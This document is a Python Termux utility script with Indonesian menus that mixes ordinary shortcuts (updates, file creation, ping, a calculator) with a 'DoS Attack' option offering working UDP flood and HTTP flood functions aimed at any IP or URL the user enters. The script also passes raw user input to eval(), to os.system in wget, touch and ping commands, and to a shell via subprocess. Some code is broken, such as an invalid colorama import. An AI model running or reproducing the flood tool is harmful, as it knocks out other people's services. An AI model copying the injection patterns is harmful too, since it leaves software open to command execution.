import os
import subprocess
import colorama
import pyfiglet # type: ignore
import numpy as np
import socket
import random
import threading
import time
import requests
from colorama import fore, Style

colorama.init(autoreset=True)

shorcuts = {
    "1": "apt update && apt upgrade -y",
    "2": "clear",
    "3": "ls",
    "4": "exit",
    "5": "nano",
    "6": "vim",
    "7": "curl ipconfig.me",
    "8": "df -h",
    "9": "top",
    "10": "termux-battery-status",
}

def show_menu():
    os.system("clear")
    logo = pyfiglet.figlet_format("Key X Amosr" , font="doom")
    print(f"{fore.CYAN}{logo}{logo}{Style.RESET_ALL}")
    print(f"{fore.GREEN}Terminal multi fungsi - pilih angka untuk fitur cepat:\n")
    print(f"""{fore.YELLOW}
          1 > Update termux
          2 > Bersihkan layar
          3 > List daftar file
          4 > Keluar
          5 > Edit file dengan nano
          6 > Edit file dengan vim
          7 > Cek IP Publik
          8 > cek Penyimpanan
          9 > Monitor CPU & RAM
          10 > Cek status baterai
          11 > Download file
          12 > Buat Folder
          13 > Buat File
          14 > Kalkulator
          15 > Ping ke server
          16 > Kalkulator matrix
          17 > DoS Attack
{Style.RESET_ALL}""")

def udp_flood(ip, port, duration):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM) 
    bytes = random._urandom(1024)

    timeout = time.time() + duration
    sent = 0

    while time.time() < timeout:
        sock.sendto(bytes, (ip, port))
        sent += 1
        print(f"{fore.RED}mengirim paket ke {ip}:{port}({sent} paket yang terkirim){Style.RESET_ALL}")

def http_fload(target_url, duration):
    timeout = time.time() + duration
    sent = 0

    while time.time() < timeout:
        try:
            response = requests.get(target_url)
            sent += 1
            print(f"{fore.RED}mengirim request ke {target_url}({sent} requet) - Status: {response.status_code}{Style.RESET_ALL}")
        except requests.exceptions.RequestException:
            print(f"{fore.RED}Gagal mengirim request ke{Style.RESET_ALL}")

def DoS_Attack():
    print(f"""{fore.GREEN}
    1 > UDP Flood Attack
    2 > HTTP Flood Attack
    3 > Kembali ke menu
    {Style.RESET_ALL}""")

    choice = input("Pilih jenis serangan Dos: ")

    if choice == "1":
        ip = input("Masukkan IP target: ")
        port = int(input("Masukkan Port: "))
        duration = int(input("Masukkan Durasi: "))
        print(f"(fore.RED)memulai serangan UDP Flood ke {ip}:{port} selama {duration} detik... {Style.RESET_ALL}")

        thread = threading.Thread(target=udp_flood, args=(ip, port, duration))
        thread.start()

    elif choice == "2":
        target_url = input("Masukkan URL target: ")
        duration = int(input("Masukkan Durasi: (detik)"))
        print(f"{fore.RED}memulai serangan HTTP Flood ke {target_url} selama {duration} detik...{Style.RESET_ALL}")

        thread = threading.Thread(target=http_fload, args=(target_url, duration))
        thread.start()

    elif choice == "3":
        return

    else:
        print(f"{fore.RED}Pilihan tidak valid{Style.RESET_ALL}")

def main():
    while True:
        show_menu()
        command = input(f"{fore.BLUE}Termux >> {Style.RESET_ALL}").strip()

        if command in shorcuts:
            os.system(shorcuts[command])
        elif command == "11":
            url = input("Masukkan URL file: ")
            os.system(f"wget {url}")
            print(f"{fore.GREEN}File berhasil diunduh ke direktori saat ini.{Style.RESET_ALL}")
        elif command == "12":
            folder_name = input("Masukkan nama folder: ")
            os.mkdir(folder_name, exist_ok=True)
            print(f"{fore.GREEN}Folder {folder_name} berhasil dibuat.{Style.RESET_ALL}")
        elif command == "13":
            file_name = input("Masukkan nama file (dengan ekstensi): ")
            os.system(f"touch {file_name}")
            print(f"{fore.GREEN}File {file_name} berhasil dibuat.{Style.RESET_ALL}")
        elif command == "14":
            expression = input("Masukkan operasi matematika: ")
            try:
                result = eval(expression)
                print(f"{fore.GREEN}Hasil: {result}{Style.RESET_ALL}")
            except Exception as e:
                print(f"{fore.RED}Error: {e}{Style.RESET_ALL}")
        elif command == "15":
            target = input("Masukkan alamat server: ")
            os.system(f"ping -c 4 {target}")
        elif command == "16":
            print(f"{fore.YELLOW}fitur kalkulator matriks akan ditambahkan...:{Style.RESET_ALL}")
        elif command == "17":
            DoS_Attack()
        elif command in ["exit", "quit",]:
            print(f"{fore.RED}Keluar dari program...{Style.RESET_ALL}")
            break
        else:
            subprocess.run(command, shell=True)

if __name__ == "__main__":
    main()